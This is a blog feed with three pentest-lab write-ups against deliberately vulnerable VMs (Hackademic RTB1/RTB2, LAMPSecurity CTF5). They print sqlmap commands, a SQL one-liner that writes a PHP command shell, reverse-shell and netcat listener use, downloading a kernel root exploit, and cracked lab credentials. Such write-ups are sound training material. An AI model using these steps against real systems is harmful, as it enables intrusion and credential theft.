<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: hacking | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/hacking/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-08-29T15:52:15-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Hackademic RTB2]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2/"/>
    <updated>2016-07-20T13:36:20-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2</id>
    <content type="html"><![CDATA[<p>The objective is the same as the previous one, get root and read key.txt</p>

<!-- more -->


<h1>Recon</h1>

<p>Again, this will be a web hacking mission, only web server is available.</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>

<p>There was nothing in the source code, no suspicious headers, no sql injection in the login. I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>

<p><code>plain
nmap -sU -F -n -T4 192.168.80.166
PORT     STATE SERVICE  REASON
5353/udp open  zeroconf udp-response ttl 255
</code></p>

<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>

<p>``` plain
nmap  -p- 192.168.80.166</p>

<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-07-21 08:14 EDT
Nmap scan report for 192.168.80.166
Host is up, received arp-response (0.00024s latency).
Not shown: 65533 closed ports, 1 filtered port
Reason: 65533 resets and 1 port-unreach
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```</p>

<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>

<p><code>plain
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 64
666/tcp open  doom    syn-ack ttl 64
</code></p>

<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>

<p><code>plain
666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))
</code></p>

<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>

<p><code>plain

</code></p>

<p>Decoding it yielded a hex string this time:</p>

<p><code>plain
3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0ad 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e
</code></p>

<p>After decoding the hex string, I got this message:</p>

<p><code>plain
&lt;---------&gt;
Knock Knock Knockin' on heaven's door .. :)
00110001 00110000 00110000 00110001 00111010 00110001 00110001 00110000 00110001 00111010 00110001 00110000 00110001 00110001 00111010 00110001 00110000 00110000 00110001
&lt;---------&gt;
</code></p>

<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>

<p>``` plain</p>

<h1>!/bin/bash</h1>

<p>for i in 1001 1101 1011 1001
do
nc 192.168.80.167 80 $i
done
```</p>

<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-hidden.png" title="&lsquo;hidden web server&rsquo; &lsquo;hidden web server&rsquo;" ></p>

<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>

<p><code>plain
Info -&gt; CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities
Versions effected: Joomla! 1.5.12
Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
Exploit: While Joomla! team announced only File Upload vulnerability, in fact there are many. See: http://www.milw0rm.com/exploits/9296
Vulnerable? Yes
</code></p>

<p>Ok, let&rsquo;s keep this in mind and continue looking. I ran Nikto against this new web server and it reported entries in robots.txt!</p>

<p><code>plain
User-agent: *
Disallow: /administrator/
Disallow: /cache/
Disallow: /components/
Disallow: /images/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /libraries/
Disallow: /media/
Disallow: /modules/
Disallow: /plugins/
Disallow: /templates/
Disallow: /tmp/
Disallow: /xmlrpc/
</code></p>

<h1>Exploit</h1>

<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>

<p>``` plain
<a href="http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3">http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3</a></p>

<p>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;%&rsquo; GROUP BY title ORDER BY title' at line 1 SQL=SELECT id, title FROM jos_content WHERE state = 1 AND UPPER(title) LIKE &lsquo;&rsquo;%&lsquo; GROUP BY title ORDER BY title
&rsquo;
```</p>

<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>

<p><code>plain
username    usertype    password
Administrator   Super Administrator 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
JSmith  Registered  992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF
BTallor Registered  abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
hacky   Registered  19630caea014ce1746ec41b074973c04:LSGCiJLhUyxZRLOMAcy96PTmbN8nnxIL
</code></p>

<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>

<p><code>plain
/* Database Settings */
var $dbtype = 'mysql';
var $host = 'localhost';
var $user = 'root';
var $password = 'yUtJklM97W';
var $db = 'joomla';
var $dbprefix = 'jos_';
</code></p>

<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>

<p><code>sql
SELECT
"&lt;? system($_REQUEST['cmd']); ?&gt;"
INTO OUTFILE "/var/www/cmd.php";
</code></p>

<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>

<p><code>plain
Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
 15:14:37 up  4:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
</code></p>

<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>

<p><code>plain
[snipped]
[*] Restoring function pointer...
id
uid=0(root) gid=0(root)
ls /root/
Desktop
Key.txt
</code></p>

<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>

<p><code>plain
root@pwnbox:~/Downloads#base64 -d key.txt &gt; decoded
root@pwnbox:~/Downloads#file decoded
decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced
</code></p>

<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-win.png" title="&lsquo;hackademic rtb2&rsquo; &lsquo;hackademic rtb 2 finished&rsquo;" ></p>

<h1>Debriefing</h1>

<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>

<p>``` plain
/ You are only young once, but you can \
\ stay immature indefinitely.          /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Hackademic RTB1]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1/"/>
    <updated>2016-07-18T09:00:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/18/pentest-lab-hackademic-rtb1</id>
    <content type="html"><![CDATA[<h1>Mission statement</h1>

<p>Get root and read the contents of the file &lsquo;key.txt&rsquo; in the root directory.</p>

<!-- more -->


<h1>Recon</h1>

<p>I started with a port scan of the target, but only the 80 port is open:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>

<p>I looked at the links and noticed the URL for the post is <a href="http://192.168.80.162/Hackademic_RTB1/?p=9">http://192.168.80.162/Hackademic_RTB1/?p=9</a> and for the archives is <a href="http://192.168.80.162/Hackademic_RTB1/?cat=1">http://192.168.80.162/Hackademic_RTB1/?cat=1</a> . Before going to Sqlmap, I manually inserted quotes in the URLs and sure enough, a SQL error for the cat parameter:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-sqli.png" title="&lsquo;sqli&rsquo; &lsquo;sql error&rsquo;" ></p>

<h1>Exploit</h1>

<p>Next I enumerated the databases with Sqlmap:</p>

<p><code>plain
sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL --dbs
available databases [3]:
[*] information_schema
[*] mysql
[*] wordpress
</code></p>

<p>Since this is a web-based challenge, I proceeded to look into the wordpress database:</p>

<p><code>plain
sqlmap -u "http://192.168.80.162/Hackademic_RTB1/?cat=1" --dbms=MySQL -D wordpress --tables
Database: wordpress
[9 tables]
+-------------------+
| wp_categories     |
| wp_comments       |
| wp_linkcategories |
| wp_links          |
| wp_options        |
| wp_post2cat       |
| wp_postmeta       |
| wp_posts          |
| wp_users          |
+-------------------+
</code></p>

<p>I further enumerated the wp_users table and here I am showing only the relevant information:</p>

<p><code>plain
user_pass               user_login
21232f297a57a5a743894a0e4a801fc3    NickJames
b986448f0bb9e5e124ca91d3d650f52c    JohnSmith
7cbb3252ba6b7e9c422fac5334d22054    GeorgeMiller
a6e514f9486b83cb53d8d932f9a04292    TonyBlack
8601f6e1028a8e8a966f6c33fcd9aec4    JasonKonnors
50484c19f1afdaf3841a0d821ed393d2    MaxBucky
</code></p>

<p>Cracking the hashes revealed the passwords of all the users:</p>

<p><code>plain
admin
PUPPIES
q1w2e3
napoleon
maxwell
kernel
</code></p>

<p>Then I went to the Wordpress login page at <a href="http://192.168.80.162/Hackademic_RTB1/wp-login.php">http://192.168.80.162/Hackademic_RTB1/wp-login.php</a> and logged in as NickJames (assumed he was admin because of his password). But there was nothing extraordinary to be done with his privileges, just adding and editing posts. We have more users to try  though! When I reached GeorgeMiller, I noticed there were more actions available in the admin panel:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-panel.png" title="&lsquo;dashboard&rsquo; &lsquo;admin panel&rsquo;" ></p>

<p>In the Presentation tab I could edit themes for the site. I picked the 404.php file and replaced its content with a line that would echo something first, so I don&rsquo;t waste my time with shells without checking if code is executed successfully.</p>

<p><img class="center" src="/images/pentest/hackademic/rtb1-404.png" title="&lsquo;404.php&rsquo; &lsquo;php file edited&rsquo;" ></p>

<p>When I went to the <a href="http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php">http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php</a> URL, I saw RCE displayed, so next I used the now-familiar reverse PHP shell from pentestmonkey. Set up my listener and visited the URL again to receive the shell:</p>

<p><code>plain
nc -vnlp 5555
listening on [any] 5555 ...
connect to [192.168.80.161] from (UNKNOWN) [192.168.80.162] 50723
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
 13:23:45 up  3:04,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=489(apache) groups=489(apache)
sh: no job control in this shell
</code></p>

<h2>Privilege escalation</h2>

<p>The shell kept echoing back the commands I was running but otherwise it worked fine. I didn&rsquo;t find anything interesting that I could use during local enumeration, so I then searched for privilege escalation exploits that might apply to the kernel version 2.6.31 found on the box. The exploit that worked was the <a href="https://www.exploit-db.com/exploits/15285/">RDS privilege escalation exploit</a> by Dan Rosenberg. You can also find it on Kali with Searchsploit. I compiled it on my machine with the <em>-m32</em> flag for the target architecture and transfered it via netcat. Then I ran it and I stared a bit at the blinking cursor before confirming that it gave me root:</p>

<p>``` plain
sh-4.0$ ./rds
./rds
[<em>] Linux kernel >= 2.6.30 RDS socket exploit
[</em>] by Dan Rosenberg
[<em>] Resolving kernel addresses&hellip;
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[</em>] Overwriting security ops&hellip;
[<em>] Linux kernel >= 2.6.30 RDS socket exploit
[</em>] by Dan Rosenberg
[<em>] Resolving kernel addresses&hellip;
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[</em>] Overwriting security ops&hellip;
[<em>] Overwriting function pointer&hellip;
[</em>] Linux kernel >= 2.6.30 RDS socket exploit
[<em>] by Dan Rosenberg
[</em>] Resolving kernel addresses&hellip;
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[<em>] Overwriting security ops&hellip;
[</em>] Overwriting function pointer&hellip;
[<em>] Triggering payload&hellip;
[</em>] Restoring function pointer&hellip;
id
uid=0(root) gid=0(root)
cat /root/key.txt
Yeah!!
You must be proud because you &rsquo;ve got the password to complete the First <em>Realistic</em> Hackademic Challenge (Hackademic.RTB1) :)</p>

<p>$<em>d&amp;jgQ>>ak#b"(Hx"o&lt;la</em>%</p>

<p>Regards,
mr.pr0n || p0wnbox.Team || 2011
<a href="http://p0wnbox.com">http://p0wnbox.com</a>
```</p>

<h1>Debriefing</h1>

<p>The machine looked pretty tightly locked with only a web server running. But the WordPress version was contained a known SQLi exploit that handed down the hashes for the users. One user had the rights to upload code on the server and facilitated geting (limited) access on the target. The kernel was vulnerable to a local root exploit, and from there it was game over.</p>

<p>GG, nice VM! Now let&rsquo;s end with some wisdom straight from the cow&rsquo;s mouth:</p>

<p>``` plain
/ Don&rsquo;t relax! It&rsquo;s only your tension \
\ that&rsquo;s holding you together.        /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - LAMPSecurity CTF5]]></title>
    <link href="http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5/"/>
    <updated>2016-05-05T12:24:38-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/05/05/pentest-lab-lampsecurity-ctf5</id>
    <content type="html"><![CDATA[<p>Continuing the LAMPSecurity series, the next machine I&rsquo;m going after is CTF5.</p>

<!-- more -->


<h3>Recon</h3>

<p>Nmap scan reveals there are plenty of open ports:</p>

<p>``` plain
nmap -sS -sV -p1-65535 192.168.80.154</p>

<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-05-09 12:17 EDT
Nmap scan report for 192.168.80.154
Host is up, received arp-response (0.00024s latency).
Not shown: 65524 closed ports
Reason: 65524 resets
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 4.7 (protocol 2.0)
25/tcp    open  smtp        syn-ack ttl 64 Sendmail 8.14.1/8.14.1
80/tcp    open  http        syn-ack ttl 64 Apache httpd 2.2.6 ((Fedora))
110/tcp   open  pop3        syn-ack ttl 64 ipop3d 2006k.101
111/tcp   open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
143/tcp   open  imap        syn-ack ttl 64 University of Washington IMAP imapd 2006k.396 (time zone: -0400)
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X (workgroup: MYGROUP)
901/tcp   open  http        syn-ack ttl 64 Samba SWAT administration server
3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.0.45
38972/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
```</p>

<p>I searched for exploits for the versions of the listed services, but I couldn&rsquo;t find anything usable. So it&rsquo;s back to the web server..</p>

<h4>Web server</h4>

<p>The website provides some potential entry points that we&rsquo;ll have to take a closer look at:</p>

<p><img class="center" src="/images/pentest/ctf5/phake.png" title="&lsquo;phake home&rsquo; &lsquo;phake org&rsquo;" ></p>

<p>We can register for a mailing list:</p>

<p><img class="center" src="/images/pentest/ctf5/list.png" title="&lsquo;mail list&rsquo; &lsquo;mailing list&rsquo;" ></p>

<p>Tampering with the about page URL <code><a href="http://192.168.80.154/?page=about">http://192.168.80.154/?page=about</a></code> gives errors, so LFI might be possible</p>

<p>The blog page also has an admin login page and another Squirrel Mail page:</p>

<p><img class="center" src="/images/pentest/ctf5/blog.png" title="&lsquo;blog&rsquo; &lsquo;blog&rsquo;" ></p>

<p>The contact form allows you to send a message to the staff, and there is another app that acts as an event manager:</p>

<p><img class="center" src="/images/pentest/ctf5/event.png" title="&lsquo;event manager&rsquo; &lsquo;event planner&rsquo;" ></p>

<p>Also, on port 901 there is a Samba SWAT server protected by basic authentication. This server provides a web-based interface for configuring Samba.</p>

<h3>Exploiting the CMS</h3>

<p>I made an account on the event manager, but that doesn&rsquo;t seem to help me much besides creating new blog posts. Next I tested to see if there might be any SQLi in the contact form, but no luck there either. And despite the path traversal error, I wasn&rsquo;t able to navigate to any arbitrary files on the system.</p>

<p>It turns out I had actually overlooked an important information. On Andy Carp&rsquo;s blog, we can see the site is powered by NanoCMS. I noticed it but I didn&rsquo;t give it any thought. When I finally thought to click on it and learn more, it took me to a domain-for-sale page, so I figured it might be some simulated CMS created for this challenge only. Good that I thought to google it and see how wrong I was :p <a href="https://github.com/kalyan02/NanoCMS">NanoCMS</a> is a lightweight CMS based on PHP that is now discontinued. However, I found a super useful <a href="http://www.madirish.net/304">NanoCMS security review</a> that made possible the compromising of the target ;)</p>

<p>Among the vulnerabilities present in the CMS, there is one that allows unrestricted access to the <code>/data/pagesdata.txt</code>. This file contains the username and password hash of the administrator:</p>

<p><code>plain
a:12:{s:8:"homepage";s:1:"1";s:10:"links_cats";a:4:{s:7:"sidebar";a:2:{i:0;i:1;i:1;i:4;}s:11:"other-pages";a:0:{}s:14:"top-navigation";a:2:{i:0;s:1:"1";i:1;s:1:"4";}s:12:"Footer-Right";a:2:{i:0;s:1:"1";i:1;s:1:"4";}}s:5:"slugs";a:2:{i:1;s:4:"home";i:4;s:7:"contact";}s:6:"titles";a:2:{i:1;s:4:"Home";i:4;s:7:"Contact";}s:10:"slug_count";i:11;s:8:"settings";a:3:{s:19:"index-last-modified";i:1234513760;s:18:"def-template-areas";a:4:{i:0;s:12:"website name";i:2;s:14:"website slogan";i:3;s:16:"below navigation";i:4;s:16:"copyright notice";}s:18:"def-template-links";a:2:{i:0;s:14:"top-navigation";i:1;s:12:"Footer-Right";}}s:13:"active-tweaks";a:2:{i:0;s:7:"deutsch";i:1;s:19:"language-pack-tweak";}s:11:"lang-select";s:7:"english";s:6:"seourl";s:1:"0";s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";s:7:"version";s:4:"v_4f";}
</code></p>

<p>I cracked the hash with my favorite <a href="https://hashkiller.co.uk/md5-decrypter.aspx">online cracker</a> and found out the password is <em>shannon</em>. Next, I logged in to the admin panel:</p>

<p><img class="center" src="/images/pentest/ctf5/nanocms.png" title="&lsquo;nanocms admin panel&rsquo; &lsquo;admin panel&rsquo;" ></p>

<p>Now we have the ability to add new pages with our own PHP code. I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey&rsquo;s reverse PHP shell</a>. I changed the IP and port, and set up a netcat listener to catch the reverse connection. Then I clicked on the newly created page on the blog and looked to my netcat for the goodies:</p>

<p><code>plain
nc -vvnlp 5555
listening on [any] 5555 ...
connect to [192.168.80.155] from (UNKNOWN) [192.168.80.154] 43028
Linux localhost.localdomain 2.6.23.1-42.fc8 #1 SMP Tue Oct 30 13:55:12 EDT 2007 i686 i686 i386 GNU/Linux
 11:02:41 up  3:30,  0 users,  load average: 0.24, 0.05, 0.02
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
sh: no job control in this shell
sh-3.2$ whoami
apache
</code></p>

<p>Time for some enumeration! Looking in the home directory, I noticed quite a few user folders:</p>

<p><code>plain
sh-3.2$ ls
amy
andy
jennifer
loren
patrick
</code></p>

<p>I looked inside them with <code>ls -al</code>. The content was very similar among them and I could find nothing interesting in the files I was allowed to read. Until patrick&rsquo;s directory, that contained more hidden files than the others:</p>

<p><code>plain
sh-3.2$ ls -al patrick
total 344
drwxrwxr-x 25 patrick patrick 4096 Dec  5  2012 .
drwxr-xr-x  7 root    root    4096 Apr 28  2009 ..
-rw-------  1 patrick patrick    0 Dec  5  2012 .ICEauthority
drwx------  2 patrick patrick 4096 Apr 28  2009 .Trash
-rw-------  1 patrick patrick  530 Dec  5  2012 .bash_history
-rw-r--r--  1 patrick patrick   33 Aug 31  2007 .bash_logout
-rw-r--r--  1 patrick patrick  176 Aug 31  2007 .bash_profile
-rw-r--r--  1 patrick patrick  124 Aug 31  2007 .bashrc
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .config
-rw-r--r--  1 patrick patrick   28 Apr 29  2009 .dmrc
drwxrwxr-x  8 patrick patrick 4096 Apr 29  2009 .evolution
drwx------  5 patrick patrick 4096 Dec  5  2012 .gconf
drwx------  2 patrick patrick 4096 Dec  5  2012 .gconfd
drwxrwxr-x  3 patrick patrick 4096 Apr 28  2009 .gnome
drwxr-xr-x  7 patrick patrick 4096 Dec  5  2012 .gnome2
drwx------  2 patrick patrick 4096 Apr 28  2009 .gnome2_private
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 .gstreamer-0.10
-rw-rw-r--  1 patrick patrick  146 Dec  5  2012 .gtk-bookmarks
-rw-r--r--  1 patrick patrick   89 Apr 28  2009 .gtkrc-1.2-gnome2
drwxr-xr-x  3 patrick patrick 4096 Apr 28  2009 .local
-rw-rw-r--  1 patrick patrick   18 Apr 29  2009 .mailboxlist
drwx------  3 patrick patrick 4096 Apr 28  2009 .metacity
drwx------  3 patrick patrick 4096 Apr 28  2009 .mozilla
-rw-------  1 patrick patrick   37 Apr 29  2009 .mysql_history
drwxr-xr-x  3 patrick patrick 4096 Dec  5  2012 .nautilus
-rw-rw-r--  1 patrick patrick  773 Dec  5  2012 .recently-used.xbel
drwxrwxr-x  4 patrick patrick 4096 Dec  5  2012 .tomboy
-rw-r--r--  1 patrick patrick 5128 Dec  5  2012 .tomboy.log
drwxr-xr-x  2 patrick patrick 4096 Dec  5  2012 .wapi
-rw-r--r--  1 patrick patrick  847 Dec  5  2012 .xsession-errors
-rw-r--r--  1 patrick patrick  658 Oct 11  2007 .zshrc
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Desktop
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Documents
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Download
-rw-------  1 patrick patrick  509 Apr 29  2009 Drafts
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Music
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Pictures
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Public
-rw-------  1 patrick patrick 4329 Apr 29  2009 Sent
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Templates
-rw-------  1 patrick patrick 1243 Apr 29  2009 Trash
drwxr-xr-x  2 patrick patrick 4096 Apr 28  2009 Videos
-rwxrw----  1 patrick patrick    0 Apr 29  2009 test.txt
</code></p>

<p>I couldn&rsquo;t read the .mysql_history or test.txt files, but the next one I tried, the <code>.tomboy.log</code> file, was really interesting! I only show the interesting bits here:</p>

<p><code>plain
sh-3.2$ cat .tomboy.log
...
12/5/2012 7:24:34 AM [DEBUG]: Creating Buffer for 'New Note 3'...
12/5/2012 7:24:34 AM [DEBUG]: New Note 3 tags:
12/5/2012 7:24:38 AM [DEBUG]: Saving 'New Note 3'...
12/5/2012 7:24:46 AM [DEBUG]: Renaming note from New Note 3 to Root password
12/5/2012 7:24:56 AM [DEBUG]: Saving 'Root password'...
12/5/2012 7:25:03 AM [DEBUG]: Saving 'Root password'...
12/5/2012 7:27:41 AM [DEBUG]: Received request for saving session
12/5/2012 7:27:41 AM [DEBUG]: Saving unsaved notes...
12/5/2012 7:27:41 AM [DEBUG]: All done.  Ciao!
</code></p>

<p>Tomboy is a note-taking application and it looks like the root password was saved in a note?! I went to the <code>.tomboy</code> directory and found some notes:</p>

<p><code>plain
sh-3.2$ ls
481bca0d-7206-45dd-a459-a72ea1131329.note
addin-db-000
addins
ae9cfc26-64e8-4f6f-a8b4-0296e8173504.note
d2684fad-3aab-444c-b90a-4f307c0818f6.note
manifest.xml
</code></p>

<p>Found the jackpot in the first one!</p>

<p>``` plain
sh-3.2$ cat 481bca0d-7206-45dd-a459-a72ea1131329.note
&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;utf-8&rdquo;?>
<note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy">
  <title>Root password</title>
  <text xml:space="preserve">&lt;note-content version=&ldquo;0.1&rdquo;>Root password</p>

<p>Root password</p>

<p>50$cent&lt;/note-content></text>
&hellip;
```</p>

<p>Now all that is left is to become root! I SSH'ed with the root credentials and the machine is mine now!</p>

<h5>Concluding remarks</h5>

<p>This was another cool challenge in the LAMPSecurity series! The exploitation was possible because of the vulnerable CMS that not only disclosed credentials, but also allowed an attacker to execute code on the target. Although the foothold gained was under an unprivileged user, certain files of the home directories were readable when they shouldn&rsquo;t have been, and the root password was sitting in an unprotected file for anyone to read. A good example of how a chain of misconfigurations can lead to total compromise of a machine.</p>

<p>``` plain
/ It&rsquo;s lucky you&rsquo;re going so slowly, \
| because you&rsquo;re going in the wrong  |
\ direction.                         /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

